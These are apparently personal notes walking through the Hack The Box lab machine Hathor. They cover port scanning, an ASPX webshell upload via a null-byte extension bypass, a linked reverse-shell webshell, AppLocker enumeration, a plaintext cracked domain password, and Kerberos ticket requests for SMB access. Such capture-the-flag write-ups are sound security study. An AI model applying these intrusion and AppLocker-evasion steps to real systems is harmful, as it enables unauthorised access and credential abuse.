# Rustscan & Nmap
```bash
rustscan -a $IP 

sudo nmap -sC -sV -oA nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49668,49674,53876,65133,65142 $IP

xsltproc -o beauty-scan.html /opt/nmap-bootstrap-xsl/nmap-bootstrap.xsl nmap.xml

DNS:hathor.windcorp.htb
Domain: windcorp.htb0
```

* https://github.com/honze-net/nmap-bootstrap-xsl#build-an-html-file-for-sharing

# Shell as windcorp/web
### Webshell
80 -> Web title -> Google default creds -> File Transfer

Upload webshell -> bypassing by adding `%00.jpg` -> "Copy" the file inorder to rename to get the `.aspx` extenstion.

### Enum
* https://0xdf.gitlab.io/2022/11/19/htb-hathor.html#shell


### INSOMNIA Shell
Adding ` 2>&1` to the end of command in the webshell to get more infos. e.g. `powershell -c Get-AppLockerPolicy -effective -xml 2>&1`

Both PowerShell and unsigned binaries like `nc.exe` are going to fail connecting out either antivirus or request not support. Probably AppLocker.
I’ll try a more full-featured webshell, like Insomnia. It has a built in reverse shell capability:

* https://github.com/A1vinSmith/pentest/blob/master/shell/insomnia_shell.aspx

# Shell as Bill
### Enum
* https://github.com/A1vinSmith/Get-bADpasswords

```cmd powershell
c:\Get-bADpasswords\Accessible\CSVs>type exported_windcorp-18032022-044046.csv
type exported_windcorp-18032022-044046.csv
Activity;Password Type;Account Type;Account Name;Account SID;Account password hash;Present in password list(s)

c:\Get-bADpasswords\Accessible\CSVs>type exported_windcorp-04102021-113140.csv
type exported_windcorp-04102021-113140.csv
Activity;Password Type;Account Type;Account Name;Account SID;Account password hash;Present in password list(s)
active;weak;regular;BeatriceMill;S-1-5-21-3783586571-2109290616-3725730865-5992;9cb01504ba0247ad5c6e08f7ccae7903;'leaked-passwords-v7'

c:\Get-bADpasswords\Accessible\CSVs>whoami
whoami
windcorp\web

c:\Get-bADpasswords\Accessible\CSVs>powershell $ExecutionContext.SessionState.LanguageMode
powershell $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage			<- CLM

c:\Get-bADpasswords\Accessible\CSVs>powershell get-applockerPolicy -effective -xml <- or without the -c
powershell get-applockerPolicy -effective -xml
<AppLockerPolicy Version="1"><RuleCollection Type="Appx" EnforcementMode="Enabled"><FilePublisherRule Id="a9e18c21-ff8f-43cf-b9fc-db40eed693ba" Name="(Default Rule) All signed packaged apps" Description="Allows members of the Everyone group to run packaged apps that are signed." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePublisherCondition PublisherName="*" ProductName="*" BinaryName="*"><BinaryVersionRange LowSection="0.0.0.0" HighSection="*" /></FilePublisherCondition></Conditions></FilePublisherRule></RuleCollection><RuleCollection Type="Dll" EnforcementMode="Enabled"><FilePublisherRule Id="5b74e91f-e7d9-4348-a21b-047d2901c659" Name="Signed by O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="*" BinaryName="*"><BinaryVersionRange LowSection="*" HighSection="*" /></FilePublisherCondition></Conditions></FilePublisherRule><FilePathRule Id="059bf360-e712-427a-8255-59d182bc4cd5" Name="%OSDRIVE%\share\scripts\7-zip64.dll" Description="" UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%OSDRIVE%\share\scripts\7-zip64.dll" /></Conditions><Exceptions><FilePathCondition Path="%OSDRIVE%\share\scripts\7-zip64.dll:*" /></Exceptions></FilePathRule><FilePathRule Id="3737732c-99b7-41d4-9037-9cddfb0de0d0" Name="(Default Rule) All DLLs located in the Program Files folder" Description="Allows members of the Everyone group to load DLLs that are located in the Program Files folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%PROGRAMFILES%\*" /></Conditions></FilePathRule><FilePathRule Id="3a07aecc-17f3-43e5-911b-ddb7e4d7353f" Name="%OSDRIVE%\Get-bADpasswords\PSI\Psi_x64.dll" Description="" UserOrGroupSid="S-1-5-21-3783586571-2109290616-3725730865-10102" Action="Allow"><Conditions><FilePathCondition Path="%OSDRIVE%\Get-bADpasswords\PSI\Psi_x64.dll" />

Name="%OSDRIVE%\share\scripts\7-zip64.dll"
"%OSDRIVE%\Get-bADpasswords\PSI\Psi_x64.dll"
```

With AppLocker enabled the files that a user can execute get restricted by the AppLocker policy. Looking at
the policy, we can see that AppLocker trusts Microsoft as a publisher. So `Sysinternals` tools can be used
to find writable paths to bypass AppLocker rules. We can use the tool `Accesschk`.

First of all, we download it on our local machine and unzip the archive. Now, we need to find a way to
transfer the executable to the remote machine. Using common Powershell commands like `Copy-Item`,
`wget` or `iwr` yielded no results, most likely due to firewall rules . So, an easy bypass to this problem is to
utilize the File Manager option from the website once again after we change the extension of the file to
`.txt`

```bash
crackmapexec smb $IP -u beatricemill -p '!!!!ilovegood17'
SMB         10.129.47.158   445    10.129.47.158    [*]  x64 (name:10.129.47.158) (domain:10.129.47.158) (signing:True) (SMBv1:False)
SMB         10.129.47.158   445    10.129.47.158    [-] 10.129.47.158\beatricemill:!!!!ilovegood17 STATUS_NOT_SUPPORTE
```

It's not supported and have to go with the Kerberos ticket way.

### Kerberos on Linux (Linux Lateral Movement)
Linux clients can authenticate to Active Directory servers via Kerberos as a Windows machine would.

To use the `kinit` command, which is used to acquire a Kerberos ticket-granting ticket (TGT) for the current user. To request a TGT, we just need to call kinit without parameters and enter the user's AD password.

When users attempt to use Kerberos and specify a principal or user name without specifying what administrative Kerberos realm that principal belongs to, the system appends the default realm. The default realm may also be used as the realm of a Kerberos service running on the local machine. Often, the default realm is the uppercase version of the local DNS domain.

But since I left it empty, I need to config the `/etc/krb5.conf` with the victim domain now. Let's use the infos from rust and nmap. One thing that the default realm is case sensitive.

* https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/system-level_authentication_guide/configuring_a_kerberos_5_server
* https://docs.bmc.com/docs/decisionsupportserverautomation/85/locating-active-directory-kdcs-350325160.html
* https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns#active-directory-servers

```bash
nslookup -type=srv _kerberos._tcp.windcorp.htb
Server:         10.129.47.158
Address:        10.129.47.158#53

_kerberos._tcp.windcorp.htb     service = 0 100 88 hathor.windcorp.htb.

sudo kinit beatricemill
Password for beatricemill@WINDCORP.HTB: 

sudo klist
Ticket cache: FILE:/tmp/krb5cc_0
Default principal: beatricemill@WINDCORP.HTB

Valid starting     Expires            Service principal
03/11/23 14:21:32  04/11/23 00:21:32  krbtgt/WINDCORP.HTB@WINDCORP.HTB
        renew until 04/11/23 14:21:11

sudo smbclient -L //hathor.windcorp.htb -U beatricemill@windcorp.htb -N -k
WARNING: The option -k|--kerberos is deprecated!
session setup failed: NT_STATUS_CONNECTION_RESET

sudo smbclient -L //hathor.windcorp.htb -U beatricemill@windcorp.htb -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        share           Disk      
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available

sudo klist
Ticket cache: FILE:/tmp/krb5cc_0
Default principal: beatricemill@WINDCORP.HTB

Valid starting     Expires            Service principal
03/11/23 14:21:32  04/11/23 00:21:32  krbtgt/WINDCORP.HTB@WINDCORP.HTB
        renew until 04/11/23 14:21:11
03/11/23 14:36:16  04/11/23 00:21:32  cifs/hathor.windcorp.htb@WINDCORP.HTB
        renew until 04/11/23 14:21:11
```

One thing need to be remind, TO turn it on&off the switch

```conf
# HTB box
# nameserver 10.129.47.158 	<- for using kinit to get a ticket
nameserver 10.10.16.2 		<- for running the smbclient	
```

##### Alternatively using Impacket
```bash
impacket-getTGT windcorp.htb/beatricemill:'!!!!ilovegood17'
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Saving ticket in beatricemill.ccache
```

##### Looking in to the share
```bash
sudo smbclient //hathor.windcorp.htb/share -U beatricemill@windcorp.htb -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Nov  3 14:43:25 2023
  ..                                DHS        0  Wed Apr 20 00:45:15 2022
  AutoIt3_x64.exe                     A  1013928  Fri Mar 16 02:17:44 2018
  Bginfo64.exe                        A  4601208  Fri Sep 20 08:15:38 2019
  scripts                             D        0  Tue Mar 22 10:22:59 2022


smb: \scripts\> dir
  .                                   D        0  Tue Mar 22 10:22:59 2022
  ..                                  D        0  Fri Nov  3 14:53:25 2023
  7-zip64.dll                         A  1076736  Tue Mar 22 02:43:58 2022
  7Zip.au3                            A    54739  Fri Oct 19 09:02:02 2012
  ZipExample.zip                      A     2333  Sun Oct  7 10:50:30 2012
  _7ZipAdd_Example.au3                A     1794  Mon Oct  8 00:15:16 2012
  _7ZipAdd_Example_using_Callback.au3      A     1855  Mon Oct  8 00:17:14 2012
  _7ZipDelete_Example.au3             A      334  Sun Oct  7 14:37:38 2012
  _7ZIPExtractEx_Example.au3          A      859  Sun Oct  7 14:38:10 2012
  _7ZIPExtractEx_Example_using_Callback.au3      A     1867  Sun Oct  7 12:04:14 2012
  _7ZIPExtract_Example.au3            A      830  Sun Oct  7 14:37:50 2012
  _7ZipFindFirst__7ZipFindNext_Example.au3      A     2027  Sun Oct  7 12:05:12 2012
  _7ZIPUpdate_Example.au3             A      372  Sun Oct  7 14:39:04 2012
  _Archive_Size.au3                   A      886  Sun Jan 23 22:51:45 2022
  _CheckExample.au3                   A      201  Sun Oct  7 12:51:30 2012
  _GetZipListExample.au3              A      144  Sun Oct  7 14:39:22 2012
  _MiscExamples.au3                   A      498  Fri Nov 28 05:04:30 2008

                10328063 blocks of size 4096. 2270930 blocks available
```

Inside the share there are two executables and one directory called scripts. Judging from the names of
the files the `Bginfo64.exe` is the BgInfo tool from Sysinternals and the `AutoIt3_x64.exe` file turns out to
be the AutoIT scripting framework.

```xml
<FilePublisherRule Id="754a60b8-3945-4ea3-ba37-f9ae529297f3" Name="Signed by O=AUTOIT CONSULTING LTD, L=BIRMINGHAM, C=GB" Description="" UserOrGroupSid="S-1-1-0" Action="Allow">
<Conditions>
<FilePublisherCondition PublisherName="O=AUTOIT CONSULTING LTD, L=BIRMINGHAM, C=GB" ProductName="*" BinaryName="*">
<BinaryVersionRange LowSection="*" HighSection="*"/>
</FilePublisherCondition>
</Conditions>
</FilePublisherRule>
```

As we can see from the above `applocker.xml`, they're matched and allowed.